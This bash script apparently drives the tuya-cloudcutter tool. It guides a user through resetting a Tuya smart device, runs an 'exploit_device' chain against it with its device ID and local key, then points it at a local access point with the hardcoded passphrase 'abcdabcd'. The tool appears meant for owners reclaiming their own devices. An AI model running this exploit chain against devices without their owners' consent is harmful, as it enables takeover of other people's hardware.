#!/usr/bin/env bash

# Select the right device
if [ "${PROFILE}" == "" ]; then
  run_in_docker pipenv run python3 get_input.py device /work/profile.txt /work/
  PROFILE=$(cat profile.txt)
  rm -f profile.txt
fi

# Connect to Tuya device's WiFi
echo "==> Toggle Tuya device's power off and on again 6 times, with ~1 sec pauses in between, to enable AP mode. Repeat if your device's SSID doesn't show up within ~30 seconds. For smart plugs long press the reset button on the device for about 5 seconds. See https://support.tuya.com/en/help/_detail/K9hut3w10nby8 for more information."
wifi_connect
if [ ! $? -eq 0 ]; then
    echo "Failed to connect, please run this script again"
    exit 1
fi

# Exploit chain
echo "Waiting 1 sec to allow device to set itself up.."
sleep 1
echo "Running initial exploit toolchain.."
echo "Using ${DEVICEID} and ${LOCALKEY}"
OUTPUT=$(run_in_docker pipenv run python3 -m cloudcutter exploit_device /work/device-profiles/${PROFILE} --deviceid "${DEVICEID}" --localkey "${LOCALKEY}")
RESULT=$?
echo "${OUTPUT}"
if [ ! $RESULT -eq 0 ]; then
    echo "Oh no, something went wrong with running the exploit! Try again I guess.."
    exit 1
fi
CONFIG_DIR=$(echo "${OUTPUT}" | grep "output=" | awk -F '=' '{print $2}' | sed -e 's/\r//')
echo "Saved device config in ${CONFIG_DIR}"


# Connect to Tuya device's WiFi again, to make it connect to our hostapd AP later
echo "==> Turn the device off and on again once. Repeat 6 more times if your device's SSID doesn't show up within ~5 seconds. For smart plugs long press the reset button on the device for about 5 seconds. See https://support.tuya.com/en/help/_detail/K9hut3w10nby8 for more information."
sleep 1
wifi_connect
if [ ! $? -eq 0 ]; then
    echo "Failed to connect, please run this script again"
    exit 1
fi
# Add a minor delay to stabilize after connection
sleep 1
OUTPUT=$(run_in_docker pipenv run python3 -m cloudcutter configure_wifi "cloudcutterflash" "abcdabcd")
RESULT=$?
echo "${OUTPUT}"
if [ ! $RESULT -eq 0 ]; then
    echo "Oh no, something went wrong with making the device connect to our hostapd AP! Try again I guess.."
    exit 1
fi
echo "Device is connecting to 'cloudcutterflash' access point. Passphrase for the AP is 'abcdabcd' (without ')"
